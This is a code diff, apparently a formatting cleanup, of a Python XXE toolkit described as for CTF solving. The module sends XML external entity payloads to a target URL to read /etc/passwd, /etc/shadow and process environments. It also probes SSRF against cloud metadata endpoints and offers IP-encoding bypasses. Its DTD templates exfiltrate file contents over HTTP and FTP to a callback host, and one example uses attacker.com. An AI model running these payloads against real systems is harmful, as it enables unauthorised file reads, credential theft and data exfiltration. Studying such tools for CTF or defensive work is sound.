@@ -4,12 +4,12 @@ XXE (XML External Entity) detection and exploitation tools for CTF solving.
 Provides utilities for detecting and exploiting XXE injection vulnerabilities.
 """
 
+import base64
 import json
 import re
-import base64
-from typing import Dict, List, Optional, Tuple
+from typing import List, Optional, Tuple
+
 import requests
-from urllib.parse import urlparse
 
 
 class XxeProbeTool:
@@ -101,7 +101,7 @@ class XxeProbeTool:
         # Nested entity
         (
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file://{file}">'
-            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>'
+            "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]>"
             "<root>test</root>",
             "Nested/Error-based",
         ),
@@ -109,7 +109,7 @@ class XxeProbeTool:
         (
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA[">'
             '<!ENTITY % file SYSTEM "file://{file}"><!ENTITY % end "]]>">'
-            '<!ENTITY % dtd "<!ENTITY xxe \'%start;%file;%end;\'>">%dtd;]>'
+            "<!ENTITY % dtd \"<!ENTITY xxe '%start;%file;%end;'>\">%dtd;]>"
             "<root>&xxe;</root>",
             "CDATA extraction",
         ),
@@ -201,7 +201,7 @@ class XxeProbeTool:
         # Trigger file not found error with partial content
         (
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file://{file}">'
-            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>'
+            "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]>"
             "<root>test</root>",
             "Error-based extraction",
         ),
@@ -215,7 +215,14 @@ class XxeProbeTool:
 
     # Success indicators for file read
     FILE_INDICATORS = {
-        "/etc/passwd": ["root:", "nobody:", "/bin/bash", "/bin/sh", "daemon:", "www-data:"],
+        "/etc/passwd": [
+            "root:",
+            "nobody:",
+            "/bin/bash",
+            "/bin/sh",
+            "daemon:",
+            "www-data:",
+        ],
         "/etc/hosts": ["127.0.0.1", "localhost", "::1"],
         "/etc/shadow": ["root:", "$6$", "$y$", "$1$", "$5$"],
         "/proc/self/environ": ["PATH=", "HOME=", "USER="],
@@ -275,8 +282,15 @@ class XxeProbeTool:
 
         try:
             return self._probe_xxe(
-                url, method, xml_param, content_type, headers, timeout,
-                probe_type, target_file, callback_host
+                url,
+                method,
+                xml_param,
+                content_type,
+                headers,
+                timeout,
+                probe_type,
+                target_file,
+                callback_host,
             )
         except requests.RequestException as e:
             return f"[XxeProbeTool] Request error: {e}"
@@ -300,11 +314,17 @@ class XxeProbeTool:
             # XML is in a form parameter
             if method == "GET":
                 return self.session.get(
-                    url, params={xml_param: payload}, headers=request_headers, timeout=timeout
+                    url,
+                    params={xml_param: payload},
+                    headers=request_headers,
+                    timeout=timeout,
                 )
             else:
                 return self.session.post(
-                    url, data={xml_param: payload}, headers=request_headers, timeout=timeout
+                    url,
+                    data={xml_param: payload},
+                    headers=request_headers,
+                    timeout=timeout,
                 )
         else:
             # XML is the request body
@@ -315,7 +335,9 @@ class XxeProbeTool:
                     url, data=payload, headers=request_headers, timeout=timeout
                 )
 
-    def _check_file_content(self, response_text: str, target_file: str) -> Tuple[bool, str]:
+    def _check_file_content(
+        self, response_text: str, target_file: str
+    ) -> Tuple[bool, str]:
         """Check if response contains file content indicators."""
         # Check known file indicators
         for file_pattern, indicators in self.FILE_INDICATORS.items():
@@ -333,9 +355,11 @@ class XxeProbeTool:
         base64_pattern = re.search(r"[A-Za-z0-9+/]{50,}={0,2}", response_text)
         if base64_pattern:
             try:
-                decoded = base64.b64decode(base64_pattern.group()).decode("utf-8", errors="ignore")
+                decoded = base64.b64decode(base64_pattern.group()).decode(
+                    "utf-8", errors="ignore"
+                )
                 if "root:" in decoded or "flag" in decoded.lower():
-                    return True, f"Base64 decoded content found"
+                    return True, "Base64 decoded content found"
             except Exception:
                 pass
 
@@ -385,7 +409,9 @@ class XxeProbeTool:
             )
             baseline_len = len(baseline.text)
             baseline_status = baseline.status_code
-            results.append(f"Baseline response: {baseline_status}, {baseline_len} bytes")
+            results.append(
+                f"Baseline response: {baseline_status}, {baseline_len} bytes"
+            )
         except Exception as e:
             results.append(f"[!] Could not get baseline response: {e}")
             baseline_len = 0
@@ -416,7 +442,9 @@ class XxeProbeTool:
                         # Check for error-based info disclosure
                         has_errors, errors = self._check_xxe_errors(resp.text)
                         if has_errors:
-                            results.append(f"[?] Possible ({desc}): Errors found - {', '.join(errors[:3])}")
+                            results.append(
+                                f"[?] Possible ({desc}): Errors found - {', '.join(errors[:3])}"
+                            )
 
                 except Exception as e:
                     results.append(f"[!] Error ({desc}): {e}")
@@ -427,15 +455,27 @@ class XxeProbeTool:
                 for common_file in self.COMMON_FILES[:5]:  # Limit to first 5
                     if common_file == target_file:
                         continue
-                    payload = self.FILE_READ_PAYLOADS[0][0].replace("{file}", common_file)
+                    payload = self.FILE_READ_PAYLOADS[0][0].replace(
+                        "{file}", common_file
+                    )
                     try:
                         resp = self._make_request(
-                            url, method, payload, xml_param, content_type, headers, timeout
+                            url,
+                            method,
+                            payload,
+                            xml_param,
+                            content_type,
+                            headers,
+                            timeout,
                         )
-                        found, indicator = self._check_file_content(resp.text, common_file)
+                        found, indicator = self._check_file_content(
+                            resp.text, common_file
+                        )
                         if found:
                             vulnerable = True
-                            results.append(f"[+] VULNERABLE: Read {common_file} - {indicator}")
+                            results.append(
+                                f"[+] VULNERABLE: Read {common_file} - {indicator}"
+                            )
                             break
                     except Exception:
                         pass
@@ -454,10 +494,16 @@ class XxeProbeTool:
 
                     # Check for metadata or internal response indicators
                     ssrf_indicators = [
-                        "ami-id", "instance-id", "meta-data",  # AWS
-                        "computeMetadata", "project-id",  # GCP
-                        "vmId", "subscriptionId",  # Azure
-                        "localhost", "127.0.0.1", "internal",
+                        "ami-id",
+                        "instance-id",
+                        "meta-data",  # AWS
+                        "computeMetadata",
+                        "project-id",  # GCP
+                        "vmId",
+                        "subscriptionId",  # Azure
+                        "localhost",
+                        "127.0.0.1",
+                        "internal",
                     ]
                     for indicator in ssrf_indicators:
                         if indicator.lower() in resp.text.lower():
@@ -467,12 +513,16 @@ class XxeProbeTool:
                     else:
                         # Check if response differs significantly
                         if abs(len(resp.text) - baseline_len) > 100:
-                            results.append(f"[?] Possible SSRF ({desc}): Response size changed ({len(resp.text)} vs {baseline_len})")
+                            results.append(
+                                f"[?] Possible SSRF ({desc}): Response size changed ({len(resp.text)} vs {baseline_len})"
+                            )
 
                 except Exception as e:
                     # Timeouts might indicate SSRF is working
                     if "timeout" in str(e).lower():
-                        results.append(f"[?] Possible SSRF ({desc}): Request timed out (might be connecting)")
+                        results.append(
+                            f"[?] Possible SSRF ({desc}): Request timed out (might be connecting)"
+                        )
 
             results.append("")
 
@@ -480,10 +530,14 @@ class XxeProbeTool:
         if probe_type in ["oob", "all"]:
             results.append("=== Out-of-Band (OOB) Payloads ===")
             results.append(f"[*] Using callback host: {callback_host}")
-            results.append("[*] Note: Monitor your callback server for incoming requests")
+            results.append(
+                "[*] Note: Monitor your callback server for incoming requests"
+            )
             results.append("")
             for payload_template, desc in self.OOB_PAYLOADS:
-                payload = payload_template.replace("{callback}", callback_host).replace("{file}", target_file)
+                payload = payload_template.replace("{callback}", callback_host).replace(
+                    "{file}", target_file
+                )
                 results.append(f"[>] {desc}:")
                 results.append(f"    {payload[:100]}...")
             results.append("")
@@ -505,13 +559,19 @@ class XxeProbeTool:
                     )
                     has_errors, errors = self._check_xxe_errors(resp.text)
                     if has_errors:
-                        results.append(f"[?] Error disclosure ({desc}): {', '.join(errors[:3])}")
+                        results.append(
+                            f"[?] Error disclosure ({desc}): {', '.join(errors[:3])}"
+                        )
 
                         # Check if file content leaks in error
-                        found, indicator = self._check_file_content(resp.text, target_file)
+                        found, indicator = self._check_file_content(
+                            resp.text, target_file
+                        )
                         if found:
                             vulnerable = True
-                            results.append(f"[+] VULNERABLE: File content in error - {indicator}")
+                            results.append(
+                                f"[+] VULNERABLE: File content in error - {indicator}"
+                            )
 
                 except Exception as e:
                     results.append(f"[!] Error ({desc}): {e}")
@@ -531,7 +591,9 @@ class XxeProbeTool:
             results.append("[*] Consider:")
             results.append("    1. Testing with OOB/blind XXE techniques")
             results.append("    2. Different file paths")
-            results.append("    3. Different XML structures matching app's expected format")
+            results.append(
+                "    3. Different XML structures matching app's expected format"
+            )
             results.append("    4. URL-encoded payloads")
 
         return "\n".join(results)
@@ -584,18 +646,18 @@ class XxePayloadGenerator:
 
     # External DTD templates for OOB exfiltration
     EXTERNAL_DTD_TEMPLATES = {
-        "basic_exfil": '''<!ENTITY % file SYSTEM "file://{target}">
+        "basic_exfil": """<!ENTITY % file SYSTEM "file://{target}">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{callback}/?data=%file;'>">
 %eval;
-%exfil;''',
-        "base64_exfil": '''<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={target}">
+%exfil;""",
+        "base64_exfil": """<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={target}">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{callback}/?data=%file;'>">
 %eval;
-%exfil;''',
-        "ftp_exfil": '''<!ENTITY % file SYSTEM "file://{target}">
+%exfil;""",
+        "ftp_exfil": """<!ENTITY % file SYSTEM "file://{target}">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://{callback}/%file;'>">
 %eval;
-%exfil;''',
+%exfil;""",
     }
 
     def use(self, tool_input: str) -> str:
@@ -662,14 +724,22 @@ class XxePayloadGenerator:
         result.append("")
         result.append("=== Tips ===")
         if payload_type == "file_read":
-            result.append("1. If direct read fails, try base64 encoding (PHP) to handle special chars")
-            result.append("2. Try different file paths: /flag.txt, /home/user/flag, /var/www/html/flag.php")
-            result.append("3. For Windows: C:\\flag.txt, C:\\Users\\Administrator\\flag.txt")
+            result.append(
+                "1. If direct read fails, try base64 encoding (PHP) to handle special chars"
+            )
+            result.append(
+                "2. Try different file paths: /flag.txt, /home/user/flag, /var/www/html/flag.php"
+            )
+            result.append(
+                "3. For Windows: C:\\flag.txt, C:\\Users\\Administrator\\flag.txt"
+            )
             result.append("4. netdoc:// might work when file:// is blocked (Java)")
         elif payload_type == "ssrf":
             result.append("1. Try internal ports: 80, 8080, 443, 8443, 3000, 5000")
             result.append("2. Test cloud metadata endpoints (169.254.169.254)")
-            result.append("3. Use IP encoding bypasses: 127.0.0.1 -> 2130706433, 0x7f000001")
+            result.append(
+                "3. Use IP encoding bypasses: 127.0.0.1 -> 2130706433, 0x7f000001"
+            )
             result.append("4. gopher:// can be used for more complex protocols")
         elif payload_type == "oob":
             result.append("1. Use interactsh.com or Burp Collaborator for testing")
@@ -719,7 +789,9 @@ class XxeDocTypeBuilder:
             if isinstance(entity, dict):
                 name = entity.get("name", "xxe")
                 value = entity.get("value", "")
-                entity_type = entity.get("type", "general")  # general, parameter, system
+                entity_type = entity.get(
+                    "type", "general"
+                )  # general, parameter, system
                 system = entity.get("system", False)
 
                 if entity_type == "parameter":
@@ -754,33 +826,52 @@ class XxeDocTypeBuilder:
             "=" * 50,
             "",
             "=== Basic File Read ===",
-            json.dumps({
-                "entities": [
-                    {"name": "xxe", "value": "file:///etc/passwd", "system": True}
-                ],
-                "root": "data",
-                "content": "&xxe;"
-            }, indent=2),
+            json.dumps(
+                {
+                    "entities": [
+                        {"name": "xxe", "value": "file:///etc/passwd", "system": True}
+                    ],
+                    "root": "data",
+                    "content": "&xxe;",
+                },
+                indent=2,
+            ),
             "",
             "=== Parameter Entity OOB ===",
-            json.dumps({
-                "entities": [
-                    {"name": "file", "value": "file:///etc/passwd", "type": "parameter", "system": True},
-                    {"name": "exfil", "value": "http://attacker.com/?d=%file;", "type": "parameter", "system": True},
-                    "%exfil;"
-                ],
-                "root": "data",
-                "content": "test"
-            }, indent=2),
+            json.dumps(
+                {
+                    "entities": [
+                        {
+                            "name": "file",
+                            "value": "file:///etc/passwd",
+                            "type": "parameter",
+                            "system": True,
+                        },
+                        {
+                            "name": "exfil",
+                            "value": "http://attacker.com/?d=%file;",
+                            "type": "parameter",
+                            "system": True,
+                        },
+                        "%exfil;",
+                    ],
+                    "root": "data",
+                    "content": "test",
+                },
+                indent=2,
+            ),
             "",
             "=== Chained Entities ===",
-            json.dumps({
-                "entities": [
-                    {"name": "a", "value": "file:///etc/passwd", "system": True},
-                    {"name": "b", "value": "&a;&a;"},
-                ],
-                "root": "data",
-                "content": "&b;"
-            }, indent=2),
+            json.dumps(
+                {
+                    "entities": [
+                        {"name": "a", "value": "file:///etc/passwd", "system": True},
+                        {"name": "b", "value": "&a;&a;"},
+                    ],
+                    "root": "data",
+                    "content": "&b;",
+                },
+                indent=2,
+            ),
         ]
         return "\n".join(examples)
